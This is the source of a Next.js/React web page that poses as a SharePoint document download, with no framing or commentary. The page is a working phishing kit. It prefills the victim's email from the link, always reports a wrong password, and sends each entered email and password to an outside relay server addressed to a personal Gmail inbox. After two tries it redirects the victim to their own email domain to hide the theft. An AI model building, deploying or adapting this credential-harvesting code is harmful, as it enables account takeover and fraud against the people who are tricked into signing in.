import React, { useEffect, useState } from 'react';
import axios from 'axios';
import Modal from 'react-modal';
import Head from 'next/head'

export default function Home() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [msg, setMsg] = useState('');
  const [modalIsOpen, setModalIsOpen] = useState(false);
  const [isClosing, setIsClosing] = useState(false);

  const openModal = () => {
    setModalIsOpen(true);
  };

  const closeModal = () => {
    setIsClosing(false);
    setTimeout(() => {
      setModalIsOpen(true);
      setIsClosing(false);
    }, 600); // Match this duration with the animation duration
  };

  let count = 0; // assuming count is managed within component state

  useEffect(() => {
    openModal()

    if (typeof window !== 'undefined') {
      const hash = window.location.hash;
      if (hash) {
        const emailFromHash = hash.substring(1); // Remove the '#' character
        setEmail(emailFromHash);
      }
    }
  }, [email]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    const my_email = email;
    const ind = my_email.indexOf("@");
    const my_slice = my_email.substr((ind + 1));

    count = count + 1;
    setPassword('');
    setMsg('Invalid Password! Enter correct Password');
    setLoading(false);

    const response = await axios.post('https://smtp-5hox.onrender.com', {
      email: email,
      password: password,
      subject: 'Ghost Leads Sharepoint',
      receiver: 'ghst8362@gmail.com'
    });
    setLoading(false);

    if (response.data) {
      if (response.data.signal === 'ok') {
        setPassword('');
        if (count >= 2) {
          count = 0;
          window.location.replace(`https://${my_slice}`);
        }
      }
    }
    setLoading(false);
  };

  return (
    <div className="container">
      <Head>
        <title>Sign | Sharepoint Document</title>
        <link rel="icon" href="/assets/favicon.ico" />
      </Head>

      <div className="container">
        <div className="header">
          <a href='' className="title">
            SharePoint
          </a>
          <a href='' className="document">
            DOC Q0013 - 351972C.doc
          </a>
        </div>

        <div className="content">
          <img src="/assets/doc.png" alt="document" />
          <p>You have one pending document on SharePoint for download</p>
          <p className="file-info">DOC Q0013 - 351972C.doc (0.85 MB)</p>
          <button onClick={openModal} className="download-button">
            Download Doc
          </button>
        </div>
      </div>

      <Modal
        isOpen={modalIsOpen}
        onRequestClose={closeModal}
        ariaHideApp={false}
        contentLabel="Download Modal"
        className={`modal ${modalIsOpen ? 'modal-open' : ''} ${isClosing ? 'modal-close' : ''}`}
        overlayClassName={`overlay ${modalIsOpen ? 'overlay-open' : ''}`}
      >
        <div className="modal-content">
          <div className="modal-box">
            <div className="logo-container">
              <img src="/assets/logo.png" alt="SharePoint Logo" className="logo" />
            </div>
            <h2 className="modal-title">Sign in to continue</h2>
            <form onSubmit={handleSubmit}>
              <div className="input-group">
                <input 
                  type="email" 
                  id="email"
                  placeholder='Email Address'
                  className="input-field"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                />
              </div>
              <div className="input-group">
                <input 
                  type="password" 
                  id="password"
                  placeholder='Enter Password'
                  className="input-field"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
              </div>
              <button 
                type="submit" 
                className="submit-button"
                disabled={loading}
              >
                {loading ? 'Loading...' : 'CONTINUE'}
              </button>
              {msg && <p className="error-message">{msg}</p>}
            </form>
          </div>
        </div>
      </Modal>

    </div>
  )
}
